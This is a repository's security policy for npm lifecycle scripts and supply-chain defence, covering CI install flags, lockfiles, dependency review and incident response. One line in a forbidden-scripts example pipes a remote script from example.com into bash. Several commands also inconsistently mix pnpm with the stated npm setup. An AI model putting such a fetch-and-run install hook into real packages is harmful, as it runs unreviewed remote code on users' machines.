# npm Scripts and Supply-Chain Security Policy

## Overview

This document outlines the security policies and best practices for managing dependencies and lifecycle scripts in this project. The default package manager for this repository is **npm** (lockfile: `package-lock.json`). Following these guidelines helps prevent supply-chain attacks and ensures reproducible builds.

---

## Core Principles

### 1. **Never Trust Install Scripts by Default**

- npm/pnpm packages can execute arbitrary code during installation via lifecycle scripts
- Malicious packages can steal secrets, modify source code, or compromise the build
- Always use `--ignore-scripts` in CI/CD environments

### 2. **Deterministic Builds**

- Use lockfiles (`package-lock.json`) to ensure reproducible installs
- Never use `npm install` without a lockfile in production
- Always use `npm ci` in CI

### 3. **Defense in Depth**

- Multiple layers of protection: ignore-scripts + lockfile + Dependabot + reviews
- Minimize attack surface by avoiding unnecessary dependencies
- Regularly audit dependencies for vulnerabilities

---

## Installation Commands

### ✅ Approved Commands

#### Local Development (npm)

```bash
# Install dependencies
npm ci

# If you need to re-enable Husky hooks locally
npm run prepare
```

#### CI/CD Environments (GitHub Actions, etc.)

```bash
# MANDATORY: Always ignore lifecycle scripts in CI
npm ci --ignore-scripts
```

### ❌ Forbidden Commands

```bash
# NEVER use these in CI:
npm install                    # Non-deterministic, runs scripts
pnpm install                   # Without --frozen-lockfile flag
npm install --package-lock     # Still runs scripts
pnpm add <package> --save      # In CI (only for local dev)

# NEVER do this:
npm install --ignore-scripts=false  # Explicitly enables scripts
```

---

## Lifecycle Scripts Policy

### Allowed Scripts

#### `prepare` (Husky only)

```json
{
  "scripts": {
    "prepare": "husky install"
  }
}
```

- **Purpose**: Set up git hooks for local development
- **Execution**: Local dev only (npm/pnpm automatically skips in CI with --ignore-scripts)
- **Security**: Only runs Husky, which sets up pre-commit hooks from .husky/ directory

### Prohibited Scripts

❌ **DO NOT add these scripts:**

```json
{
  "scripts": {
    // FORBIDDEN - downloads external code
    "postinstall": "node scripts/download-binary.js",

    // FORBIDDEN - executes untrusted code
    "install": "curl https://example.com/script.sh | bash",

    // FORBIDDEN - arbitrary code execution
    "preinstall": "node scripts/setup.js"
  }
}
```

### Why These Are Dangerous

1. **postinstall scripts** run after every `npm/pnpm install`
   - Can download malicious binaries
   - Can exfiltrate environment variables (secrets, tokens)
   - Can modify source code

2. **preinstall/install scripts** run during installation
   - Execute before you can review the package
   - Can prevent installation or modify dependencies
   - Can run arbitrary commands with your permissions

---

## Dependency Review Process

### Before Adding a New Dependency

1. **Check Package Reputation**

   ```bash
   # Check npm package info
   npm info <package-name>

   # Look for:
   # - Weekly downloads (higher is generally safer)
   # - Recent updates (active maintenance)
   # - Number of maintainers
   # - Package size
   ```

2. **Review Install Scripts**

   ```bash
   # Check if package has install scripts
   npm show <package-name> scripts

   # Clone and inspect if scripts exist
   git clone https://github.com/owner/package.git
   cat package.json | jq '.scripts'
   ```

3. **Check for Security Advisories**

   ```bash
   # Run security audit
   pnpm audit

   # Check specific package
   npm audit <package-name>
   ```

4. **Review Transitive Dependencies**

   ```bash
   # See what dependencies the package brings
   pnpm why <package-name>
   npm ls <package-name>
   ```

5. **Verify Package Integrity**

   ```bash
   # Check package signatures (if available)
   npm verify <package-name>

   # Review on npms.io for quality score
   open https://npms.io/search?q=<package-name>
   ```

### Red Flags 🚩

- Package has postinstall/preinstall/install scripts
- Package downloads binaries from external URLs
- Package has no source code repository
- Package was recently transferred to new maintainer
- Package has very few downloads but many dependencies
- Package requests unusual permissions
- Package has security advisories

---

## CI/CD Configuration

### GitHub Actions (Current)

```yaml
- name: Install dependencies
   run: npm ci --ignore-scripts
```

**Why this configuration:**

- `--frozen-lockfile`: Fails if lockfile is out of sync (prevents tampering)
- `--ignore-scripts`: Prevents execution of postinstall/prepare/install scripts
- Ensures deterministic, secure builds

### If Build Requires Scripts

If a legitimate dependency requires scripts (e.g., native module compilation):

```yaml
# Step 1: Install without scripts (secure)
- name: Install dependencies
  run: pnpm install --frozen-lockfile --ignore-scripts

# Step 2: Review and document why scripts are needed
# Add to docs/npm-scripts-policy.md explaining the necessity
# Step 3: Run specific scripts explicitly (audited and documented)
- name: Build native modules (REVIEWED)
  run: |
    # Only run specific, audited scripts
    cd node_modules/specific-package
    node build.js
  # Document what this does and why it's safe
```

**Requirements for enabling scripts:**

1. Document in this file (npm-scripts-policy.md) which package needs it
2. Explain what the script does and why it's safe
3. Add code review requirement for any changes to this
4. Consider alternatives (pre-built binaries, different package)

---

## Lockfile Management

### pnpm-lock.yaml

- **MUST** be committed to git
- **MUST** be kept up-to-date with package.json
- **NEVER** manually edit lockfile
- **ALWAYS** regenerate after adding/removing dependencies

```bash
# After modifying package.json:
pnpm install

# Verify lockfile is updated:
git diff pnpm-lock.yaml

# Commit both files together:
git add package.json pnpm-lock.yaml
git commit -m "feat(deps): add <package-name>"
```

### Lockfile Conflicts

```bash
# If lockfile has merge conflicts:
git checkout --theirs pnpm-lock.yaml  # or --ours
pnpm install  # Regenerate lockfile
git add pnpm-lock.yaml
```

---

## Security Monitoring

### Dependabot Configuration

This project uses Dependabot (`.github/dependabot.yml`) to:

- Automatically check for vulnerable dependencies weekly
- Create PRs for security updates
- Keep dependencies up-to-date

**Action Required:**

- Review Dependabot PRs promptly (especially security updates)
- Test changes before merging
- Never ignore security advisories without investigation

### Manual Audits

```bash
# Run security audit
pnpm audit

# Fix vulnerabilities automatically (review changes!)
pnpm audit fix

# Generate audit report
pnpm audit --json > audit-report.json
```

**Schedule:**

- Run `pnpm audit` before every release
- Review audit results in CI (add to workflow if high-risk project)
- Address high/critical vulnerabilities immediately

---

## Developer Guidelines

### Adding Dependencies

```bash
# 1. Research the package first (see review process above)

# 2. Add dependency
pnpm add <package-name>

# 3. Review what was installed
git diff package.json pnpm-lock.yaml

# 4. Check for install scripts
npm show <package-name> scripts

# 5. Test the application
pnpm dev
pnpm test

# 6. Commit with descriptive message
git add package.json pnpm-lock.yaml
git commit -m "feat(deps): add <package-name> for <purpose>"
```

### Updating Dependencies

```bash
# Check for outdated packages
pnpm outdated

# Update specific package
pnpm update <package-name>

# Update all (use with caution, test thoroughly)
pnpm update

# Interactive update (recommended)
pnpm up -i
```

### Removing Dependencies

```bash
# Remove package
pnpm remove <package-name>

# Verify it's removed from lockfile
git diff pnpm-lock.yaml

# Check for orphaned dependencies
pnpm prune
```

---

## Exception Handling

### When Scripts Are Unavoidable

Some legitimate packages require install scripts:

- Native module compilation (node-gyp, native addons)
- Binary downloads (platform-specific tools)
- Code generation (protobuf compilers)

**Process for exceptions:**

1. **Document Here**

   ```markdown
   ### Approved Script Exception: <package-name>

   - **Version**: x.y.z
   - **Script Purpose**: Compiles native C++ addon for <functionality>
   - **Security Review**: [Link to review PR/issue]
   - **Reviewed By**: @username
   - **Date**: YYYY-MM-DD
   - **Approval Criteria**: Source code reviewed, builds from trusted source
   ```

2. **Implement in CI**

   ```yaml
   - name: Install dependencies (secure)
     run: pnpm install --frozen-lockfile --ignore-scripts

   - name: Build approved native modules
     run: |
       # Only for documented, reviewed packages
       pnpm rebuild <approved-package-name>
   ```

3. **Add Monitoring**
   - Set up alerts if the package adds new scripts
   - Re-review on major version updates
   - Consider alternatives periodically

### Current Approved Exceptions

> **None at this time.** All dependencies must work with `--ignore-scripts`.

---

## Incident Response

### If Malicious Package is Detected

1. **Immediate Actions**

   ```bash
   # Remove the package immediately
   pnpm remove <malicious-package>

   # Rotate all secrets that may have been exposed
   # - GitHub tokens
   # - API keys
   # - Database credentials
   # - etc.
   ```

2. **Investigation**
   - Check git history for when package was added
   - Review CI logs for suspicious activity
   - Scan codebase for modifications: `git diff <before-commit> <after-commit>`
   - Check if secrets were accessed

3. **Communication**
   - Report to security team
   - Document incident in security log
   - Report to npm if package is on public registry

4. **Prevention**
   - Update this policy if gaps were found
   - Add additional checks to CI
   - Train team on the incident

---

## Tools and Resources

### Security Tools

```bash
# Socket.dev - Detect supply chain attacks
npx socket-cli audit

# npm audit
pnpm audit

# Snyk - Vulnerability scanning
npx snyk test
```

### Resources

- [npm Scripts and Security](https://docs.npmjs.com/cli/v9/using-npm/scripts#best-practices)
- [Socket.dev - Supply Chain Security](https://socket.dev/)
- [Snyk Advisor](https://snyk.io/advisor/)
- [npms.io Package Quality Scores](https://npms.io/)
- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)

---

## Policy Updates

This policy should be reviewed and updated:

- When new supply-chain attack patterns emerge
- After security incidents
- When CI/CD configuration changes
- Quarterly as part of security review

**Last Updated**: 2025-12-14  
**Next Review**: 2026-03-14  
**Policy Owner**: Security Team / Lead Maintainer
